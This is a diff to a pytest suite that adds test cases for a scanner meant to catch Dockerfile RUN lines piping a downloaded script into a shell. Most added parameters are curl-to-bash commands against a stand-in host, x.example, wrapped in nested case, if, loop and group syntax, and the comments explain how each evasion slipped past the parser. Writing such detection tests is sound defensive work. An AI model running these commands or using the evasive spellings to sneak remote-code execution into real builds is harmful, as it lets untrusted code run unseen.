@@ -420,6 +420,72 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh | case $x in a) jq .;; *) bash;; esac\n",
             id="case-later-branch",
         ),
+        # A `case` NESTED under another compound. The keyword strip is flat, so the inner `case`
+        # lost its own `case`/`in`/`esac` while keeping the branch's `)`, and the pattern was read
+        # as the body's command again -- the exact defect the top-level `case` handling fixed, one
+        # level down. Every spelling runs the download:
+        #   printf 'echo PWNED\n' | if true; then case x in x) bash;; esac; fi        ->  PWNED
+        #   printf 'echo PWNED\n' | while true; do case x in x) bash;; esac; break; done  ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | if true; then case x in x) bash;; esac; fi\n",
+            id="case-nested-in-an-if",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh"
+            " | while true; do case x in x) bash;; esac; break; done\n",
+            id="case-nested-in-a-while",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | for i in 1; do case x in x) bash;; esac; done\n",
+            id="case-nested-in-a-for",
+        ),
+        pytest.param(
+            "RUN if true; then case x in x) curl -sSL https://x.example/i.sh | bash;; esac; fi\n",
+            id="pipeline-inside-a-case-inside-an-if",
+        ),
+        # A GROUP inside a `case` branch. Dropping everything up to each `)` also swallowed the `(`
+        # of a group opening the branch body, so its contents went with the pattern. Only a `)`
+        # reached while the `case` awaits a label ends one; the rest close groups and are kept:
+        #   printf 'echo PWNED\n' | case x in x) ( bash );; esac   ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case x in x) ( bash );; esac\n",
+            id="group-inside-a-case-branch",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case x in x) echo a; ( bash );; esac\n",
+            id="group-later-in-a-case-branch",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case x in x) case y in y) bash;; esac;; esac\n",
+            id="case-inside-a-case-branch",
+        ),
+        # The optional leading `(` on a label is valid POSIX and must still read as a label, not as
+        # a group opening the branch:  printf 'echo PWNED\n' | case x in (x) bash;; esac  ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case x in (x) bash;; esac\n",
+            id="case-label-with-a-leading-paren",
+        ),
+        # `case` as an ARGUMENT inside a clause that also holds a group. Treating that word as the
+        # keyword arms the label strip, and the group's `)` then reads as a label terminator that
+        # takes `( bash` with it -- turning a catch into a miss on a line that runs the download:
+        #   printf 'echo PWNED\n' | if true; then echo case; ( bash ); fi   ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | if true; then echo case; ( bash ); fi\n",
+            id="case-as-a-word-beside-a-group",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh"
+            " | if true; then apt-get install -y case; ( bash ); fi\n",
+            id="case-as-a-package-name-beside-a-group",
+        ),
+        # A group AFTER the `case` has closed. `esac` has to un-arm the label strip, or this `)`
+        # reads as a label terminator and discards `( bash` -- a miss on a line that runs:
+        #   printf 'echo PWNED\n' | if true; then case x in x) echo a;; esac; ( bash ); fi -> PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh"
+            " | if true; then case x in x) echo a;; esac; ( bash ); fi\n",
+            id="group-after-a-closed-case",
+        ),
         # The WHOLE pipeline may sit inside the group or clause, rather than being piped into it.
         # Then the fetch never appears at the top level at all -- the enclosing construct is one
         # stage, and a scan that only walks top-level stages sees a single command with no pipe in
